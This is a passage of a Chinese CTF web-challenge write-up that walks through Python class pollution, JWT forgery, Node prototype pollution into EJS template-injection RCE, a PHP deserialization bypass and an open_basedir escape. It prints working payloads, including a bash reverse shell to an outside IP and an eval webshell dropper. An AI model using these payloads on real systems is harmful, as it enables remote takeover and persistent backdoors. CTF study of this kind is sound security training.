class_">User</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;aa&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;bb&quot;</span></span><br><span class="line">        self.isvip=<span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">hhh</span>(<span class="title class_ inherited__">User</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        self.username=<span class="string">&quot;cc&quot;</span></span><br><span class="line">        self.password=<span class="string">&quot;dd&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">user = hhh()</span><br><span class="line"><span class="comment">#</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">&quot;username&quot;: &quot;test&quot;,</span></span><br><span class="line"><span class="string">&quot;password&quot;: &quot;test002&quot;,</span></span><br><span class="line"><span class="string">&quot;\u0069\u0073\u0076\u0069\u0070&quot; : &quot;111&quot;</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = json.loads(payload)</span><br><span class="line"><span class="built_in">print</span>(payload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(user.username)</span><br><span class="line"><span class="built_in">print</span>(user.password)</span><br><span class="line"></span><br><span class="line">merge(payload, user)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(user.username)</span><br><span class="line"><span class="built_in">print</span>(user.password)</span><br><span class="line"><span class="built_in">print</span>(user.isvip)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这里用unicode编码绕过waf，json.load会自动进行unicode解码，</p>
<p>绕后就是绕过</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="string">&#x27;0&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">and</span> data != <span class="string">&quot;123456789&quot;</span> <span class="keyword">and</span> <span class="built_in">int</span>(data) == <span class="number">123456789</span> <span class="keyword">and</span> <span class="built_in">len</span>(data) &lt;=<span class="number">10</span>:</span><br></pre></td></tr></table></figure>

<p>这里比较简单了用空格或者字符“+”或者0，这里将0禁止了用前面两者就行，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?=%20123456789</span><br><span class="line">或者</span><br><span class="line">?=+123456789</span><br></pre></td></tr></table></figure>





<h2 id="雨"><a href="#雨" class="headerlink" title="雨"></a>雨</h2><p>根据hint secret_key是出题人的id:VanZY(我当时没看hint，用脚本也可以爆破出来)，然后伪造jwt，得到源码</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt = <span class="built_in">require</span>(<span class="string">&#x27;jsonwebtoken&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> app = <span class="title function_">express</span>();</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">&#x27;body-parser&#x27;</span>)</span><br><span class="line"><span class="keyword">const</span> path = <span class="built_in">require</span>(<span class="string">&#x27;path&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> jwt_secret = <span class="string">&quot;VanZY&quot;</span>;</span><br><span class="line"><span class="keyword">const</span> cookieParser = <span class="built_in">require</span>(<span class="string">&#x27;cookie-parser&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> putil_merge = <span class="built_in">require</span>(<span class="string">&quot;putil-merge&quot;</span>)</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;views&#x27;</span>, <span class="string">&#x27;./views&#x27;</span>);</span><br><span class="line">app.<span class="title function_">set</span>(<span class="string">&#x27;view engine&#x27;</span>, <span class="string">&#x27;ejs&#x27;</span>);</span><br><span class="line">app.<span class="title function_">use</span>(<span class="title function_">cookieParser</span>());</span><br><span class="line">app.<span class="title function_">use</span>(bodyParser.<span class="title function_">urlencoded</span>(&#123;<span class="attr">extended</span>: <span class="literal">true</span>&#125;)).<span class="title function_">use</span>(bodyParser.<span class="title function_">json</span>())</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Super</span> = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> safecode = <span class="keyword">function</span> (<span class="params">code</span>)&#123;</span><br><span class="line">    <span class="keyword">let</span> validInput = <span class="regexp">/global|mainModule|import|constructor|read|write|_load|exec|spawnSync|stdout|eval|stdout|Function|setInterval|setTimeout|var|\+|\*/ig</span>;</span><br><span class="line">    <span class="keyword">return</span> !validInput.<span class="title function_">test</span>(code);</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/code&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span> &amp;&amp; req.<span class="property">body</span>) &#123;</span><br><span class="line">    <span class="title function_">putil_merge</span>(&#123;&#125;, req.<span class="property">body</span>, &#123;<span class="attr">deep</span>:<span class="literal">true</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&quot;welcome to code&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/hint&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;I heard that the challenge maker likes to use his own id as secret_key&quot;</span>);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/source&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">var</span> auth = req.<span class="property">cookies</span>.<span class="property">auth</span>;</span><br><span class="line">  jwt.<span class="title function_">verify</span>(auth, jwt_secret , <span class="keyword">function</span>(<span class="params">err, decoded</span>) &#123;</span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">      <span class="keyword">if</span>(decoded.<span class="property">user</span>===<span class="string">&#x27;admin&#x27;</span>)&#123;</span><br><span class="line">        res.<span class="title function_">sendFile</span>(path.<span class="title function_">join</span>(__dirname + <span class="string">&#x27;/index.js&#x27;</span>));</span><br><span class="line">      &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        res.<span class="title function_">send</span>(<span class="string">&#x27;you are not admin    &lt;!--Maybe you can view /hint--&gt;&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">catch</span>&#123;</span><br><span class="line">      res.<span class="title function_">send</span>(<span class="string">&quot;Fuck you Hacker!!!&quot;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/create&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (!req.<span class="property">body</span>.<span class="property">name</span> || req.<span class="property">body</span>.<span class="property">name</span> === <span class="literal">undefined</span> || req.<span class="property">body</span>.<span class="property">name</span> === <span class="literal">null</span>)&#123;</span><br><span class="line">    res.<span class="title function_">send</span>(<span class="string">&quot;please input name&quot;</span>);</span><br><span class="line">  &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title class_">Super</span>[<span class="string">&#x27;userrole&#x27;</span>] === <span class="string">&#x27;Superadmin&#x27;</span>) &#123;</span><br><span class="line">        res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, req.<span class="property">body</span>);</span><br><span class="line">      &#125;<span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="title function_">safecode</span>(req.<span class="property">body</span>.<span class="property">name</span>)) &#123;</span><br><span class="line">            res.<span class="title function_">send</span>(<span class="string">&quot;你在做什么？快停下！！！&quot;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, &#123;<span class="attr">name</span>: req.<span class="property">body</span>.<span class="property">name</span>&#125;);</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">get</span>(<span class="string">&#x27;/&#x27;</span>,<span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">    res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">    <span class="keyword">var</span> token = jwt.<span class="title function_">sign</span>(&#123;<span class="string">&#x27;user&#x27;</span>:<span class="string">&#x27;guest&#x27;</span>&#125;,jwt_secret,&#123; <span class="attr">algorithm</span>: <span class="string">&#x27;HS256&#x27;</span> &#125;);</span><br><span class="line">    res.<span class="title function_">cookie</span>(<span class="string">&#x27;auth &#x27;</span>,token);</span><br><span class="line">    res.<span class="title function_">end</span>(<span class="string">&#x27;Only admin can get source in /source&#x27;</span>);</span><br><span class="line"></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">app.<span class="title function_">listen</span>(<span class="number">3000</span>, <span class="function">() =&gt;</span> <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Server started on port 3000&#x27;</span>));</span><br></pre></td></tr></table></figure>



<p>代码比较简单，一看就是需要某种权限才能执行某些命令，nodejs原型链污染的老套路了</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title class_">Super</span>[<span class="string">&#x27;userrole&#x27;</span>] === <span class="string">&#x27;Superadmin&#x27;</span>) &#123;</span><br><span class="line">    res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, req.<span class="property">body</span>);</span><br></pre></td></tr></table></figure>

<p>在这里，需要Super[‘userrole’]的值为Superadmin，但是整个代码也没有涉及到可以让Super[‘userrole’]的值为Superadmin的地方，但是凭空多出来一个code路由，putil_merge函数和merge函数，基本可以确定这里有问题了</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">app.<span class="title function_">all</span>(<span class="string">&#x27;/code&#x27;</span>, <span class="function">(<span class="params">req, res</span>) =&gt;</span> &#123;</span><br><span class="line">  res.<span class="title function_">type</span>(<span class="string">&#x27;html&#x27;</span>);</span><br><span class="line">  <span class="keyword">if</span> (req.<span class="property">method</span> == <span class="string">&quot;POST&quot;</span> &amp;&amp; req.<span class="property">body</span>) &#123;</span><br><span class="line">    <span class="title function_">putil_merge</span>(&#123;&#125;, req.<span class="property">body</span>, &#123;<span class="attr">deep</span>:<span class="literal">true</span>&#125;);</span><br><span class="line">  &#125;</span><br><span class="line">  res.<span class="title function_">send</span>(<span class="string">&quot;welcome to code&quot;</span>);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>上网搜索putil_merge函数，发现确实存在原型链污染</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> putil_merge = <span class="built_in">require</span>(<span class="string">&#x27;putil-merge&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> payload = <span class="title class_">JSON</span>.<span class="title function_">parse</span>(<span class="string">&#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;polluted&quot;: &quot;yes&quot;&#125;&#125;&#125;&#x27;</span>);</span><br><span class="line"><span class="keyword">let</span> obj = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Before:&quot;</span> + &#123;&#125;.<span class="property">polluted</span>)</span><br><span class="line"><span class="title function_">putil_merge</span>(obj, payload, &#123; <span class="attr">deep</span>: <span class="literal">true</span> &#125;);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;After:&quot;</span> + &#123;&#125;.<span class="property">polluted</span>)</span><br></pre></td></tr></table></figure>

<p>改成</p>
<p>要改成application&#x2F;json</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET :/code</span><br></pre></td></tr></table></figure>

<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">POST<span class="punctuation">:</span><span class="punctuation">&#123;</span><span class="attr">&quot;constructor&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;prototype&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="attr">&quot;userrole&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Superadmin&quot;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>将Super[‘userrole’]的值改为Superadmin，就有权限执行：</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">res.<span class="title function_">render</span>(<span class="string">&#x27;index&#x27;</span>, req.<span class="property">body</span>);</span><br></pre></td></tr></table></figure>

<p>这里是一个cve，可以参考这位<a target="_blank" rel="noopener" href="https://inhann.top/2023/03/26/ejs/">大佬</a></p>
<p>影响版本：ejs &lt;&#x3D; v3.1.9 （最新版本</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line"><span class="string">&quot;name&quot;</span>:<span class="string">&quot;abc&quot;</span>,</span><br><span class="line">  <span class="string">&quot;settings&quot;</span>:&#123;</span><br><span class="line">    <span class="string">&quot;view options&quot;</span>:&#123;</span><br><span class="line">      <span class="string">&quot;escapeFunction&quot;</span>:<span class="string">&quot;console.log;this.global.process.mainModule.require(&#x27;child_process&#x27;).execSync(\&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/81.71.13.76/5050 0&gt;&amp;1&#x27;\&quot;);&quot;</span>,</span><br><span class="line">      <span class="string">&quot;client&quot;</span>:<span class="string">&quot;true&quot;</span></span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>







<h2 id="ez-remove"><a href="#ez-remove" class="headerlink" title="ez_remove"></a>ez_remove</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">syc</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$lover</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span></span><br><span class="line"><span class="function">    </span>&#123;   <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;lover;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;daozhel&quot;</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">eval</span>(<span class="variable language_">$this</span>-&gt;lover);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/lover/i&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$a</span>=<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;web&#x27;</span>]);</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;快来玩快来玩~&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span>(<span class="string">&quot;nonono&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>

<p>利用十六进制要绕过正则匹配</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lover ==&gt; \6cover</span><br></pre></td></tr></table></figure>

<p>利用gc回收绕过异常</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:3:&quot;syc&quot;:1  ==&gt; O:3:&quot;syc&quot;:2</span><br></pre></td></tr></table></figure>

<p>写入一句话木马，这里需要注意的是要将<strong>小写s转变大写S</strong> ,才能解析十六进制</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?web=O:<span class="number">3</span>:<span class="string">&quot;syc&quot;</span>:<span class="number">2</span>:&#123;S:<span class="number">5</span>:<span class="string">&quot;\6cover&quot;</span>;s:<span class="number">53</span>:<span class="string">&quot;file_put_contents(&#x27;2.php&#x27;,&#x27;&lt;?php @eval(<span class="subst">$_POST</span>[1]);&#x27;);&quot;</span>;&#125;</span><br></pre></td></tr></table></figure>



<p>写入木马 ，发现无法正常执行shell命令，读取phpinfo查看disable_functions</p>
<p>发现禁用了函数<strong>system,exec,shell_exec,fopen,pcmtl_exe,passthru,popen</strong></p>
<p>还有<strong>open_basedir: &#x2F;var&#x2F;www&#x2F;html&#x2F;</strong></p>
<p>绕过open_basedir: <strong>ini_set用来设置php.ini的值，无需打开php.ini文件，就能修改配置</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">mkdir</span>(<span class="string">&#x27;test&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;test&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">chdir</span>(<span class="string">&#x27;..&#x27;</span>);<span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;open_basedir&#x27;</span>,<span class="string">&#x27;/&#x27;</span>);<span class="title function_ invoke__">show_source</span>(<span class="string">&quot;f1ger&quot;</span>);</span><br></pre></td></tr></table></figure>

<h2 id="ez-path-os-path-join"><a href="#ez-path-os-path-join" class="headerlink" title="ez_path(os.path.join)"></a>ez_path(os.path.join)</h2><p><a target="_blank" rel="noopener" href="https://www.toolkk.com/tools/pyc-decomplie#google_vignette">pyc在线反汇编</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># uncompyle6 version 3.8.0</span></span><br><span class="line"><span class="comment"># Python bytecode 3.6 (3379)</span></span><br><span class="line"><span class="comment"># Decompiled from: Python 3.7.0 (default, Nov 25 2022, 11:07:23) </span></span><br><span class="line"><span class="comment"># [GCC 4.8.5 20150623 (Red Hat 4.8.5-44)]</span></span><br><span class="line"><span class="comment"># Embedded file name: ./tempdata/96e9aea5-79fb-4a2f-a6b9-d4f3bbf3c906.py</span></span><br><span class="line"><span class="comment"># Compiled at: 2023-08-26 01:33:29</span></span><br><span class="line"><span class="comment"># Size of source mod 2**32: 2076 bytes</span></span><br><span class="line"><span class="keyword">import</span> os, uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template, request, redirect</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">ARTICLES_FOLDER = <span class="string">&#x27;articles/&#x27;</span></span><br><span class="line">articles = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Article</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, article_id, title, content</span>):</span><br><span class="line">        self.article_id = article_id</span><br><span class="line">        self.title = title</span><br><span class="line">        self.content = content</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_article_id</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, articles=articles)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/upload&#x27;</span>, methods=[<span class="string">&#x27;GET&#x27;</span>, <span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">upload</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        title = request.form[<span class="string">&#x27;title&#x27;</span>]</span><br><span class="line">        content = request.form[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">        article_id = generate_article_id()</span><br><span class="line">        article = Article(article_id, title, content)</span><br><span class="line">        articles.append(article)</span><br><span class="line">        save_article(article_id, title, content)</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&#x27;/&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;upload.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/article/&lt;article_id&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">article</span>(<span class="params">article_id</span>):</span><br><span class="line">    <span class="keyword">for</span> article <span class="keyword">in</span> articles:</span><br><span class="line">        <span class="keyword">if</span> article.article_id == article_id:</span><br><span class="line">            title = article.title</span><br><span class="line">            sanitized_title = sanitize_filename(title)</span><br><span class="line">            article_path = os.path.join(ARTICLES_FOLDER, sanitized_title)</span><br><span class="line">            <span class="keyword">with</span> <span class="built_in">open</span>(article_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> (file):</span><br><span class="line">                content = file.read()</span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&#x27;articles.html&#x27;</span>, title=sanitized_title, content=content, article_path=article_path)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;error.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> 